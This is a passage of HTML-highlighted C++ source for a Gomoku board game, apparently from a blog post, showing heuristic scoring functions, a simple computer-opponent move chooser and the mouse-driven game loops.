class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">2</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">70</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">70</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">death3</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">4</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">2</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">50</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">50</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">live2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">3</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">1</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">40</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">40</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">death2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">3</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">1</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">30</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">30</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">AI</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b_x = <span class=\"number\">8</span>, b_y = <span class=\"number\">8</span>, w_x = <span class=\"number\">8</span>, w_y = <span class=\"number\">8</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(black, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(black));</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(white, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(white));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt;= <span class=\"number\">15</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt;= <span class=\"number\">15</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!pos[i][j])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tpos[i][j] = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (lian5(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live4(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live3(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (chong4(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (death3(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live2(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (death2(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tpos[i][j] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (lian5(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live4(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live3(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (chong4(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (death3(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (live2(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (death2(i, j))<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tpos[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (black[i][j] &gt; black[b_x][b_y])b_x = i, b_y = j;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (white[i][j] &gt; white[w_x][w_y])w_x = i, w_y = j;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (black[b_x][b_y] &lt;= white[w_x][w_y])Play(w_x + <span class=\"number\">2</span>, w_y, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> Play(b_x + <span class=\"number\">2</span>, b_y, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">GameAI</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> turn = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tkey = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(pos, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(pos));</span><br><span class=\"line\">\t<span class=\"comment\">/*setfillcolor(EGERGB(0, 0, 0));</span></span><br><span class=\"line\"><span class=\"comment\">\tbar(10, 200, 90, 230);</span></span><br><span class=\"line\"><span class=\"comment\">\tsetcolor(EGERGB(0, 0, 255));</span></span><br><span class=\"line\"><span class=\"comment\">\tsetfont(20, 0, &quot;宋体&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">\txyprintf(10, 205, &quot;玩家先手&quot;);*/</span></span><br><span class=\"line\">\tmouse_msg msg;</span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; is_run();)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tmsg = getmouse();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (msg.is_up())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">/*if (flag)//flag标记是否开始游戏</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tif (msg.x &gt;= 10 &amp;&amp; msg.x &lt;= 90 &amp;&amp; msg.y &gt;= 200 &amp;&amp; msg.y &lt;= 230)</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tsetfillcolor(EGERGB(0, 0, 0));</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tbar(10, 200, 90, 230);</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tsetcolor(EGERGB(0, 0, 255));</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tsetfont(20, 0, &quot;宋体&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\txyprintf(10, 205, &quot;电脑先手&quot;);</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tflag = false;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&#125;*/</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (msg.x % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span>, msg.y / <span class=\"number\">40</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\tAI();</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span>, msg.y / <span class=\"number\">40</span> + <span class=\"number\">1</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\tAI();</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span> + <span class=\"number\">1</span>, msg.y / <span class=\"number\">40</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\tAI();</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span> + <span class=\"number\">1</span>, msg.y / <span class=\"number\">40</span> + <span class=\"number\">1</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t\tAI();</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (Checker())<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">GamePeople</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tkey = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(pos, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(pos));</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> turn = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tmouse_msg msg;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (; is_run();)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tmsg = getmouse();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (msg.is_up())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (msg.x % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span>, msg.y / <span class=\"number\">40</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span>, msg.y / <span class=\"number\">40</span> + <span class=\"number\">1</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.x % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &lt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span class=\"number\">40</span> + <span class=\"number\">1</span>, msg.y / <span class=\"number\">40</span>, turn % <span class=\"number\">2</span>))</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tturn++;</span><br><span class=\"line\">\t\t\t\t\t\tCounter(turn);</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (msg.y % <span class=\"number\">40</span> &gt; <span class=\"number\">20</span>)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (Play(msg.x / <span 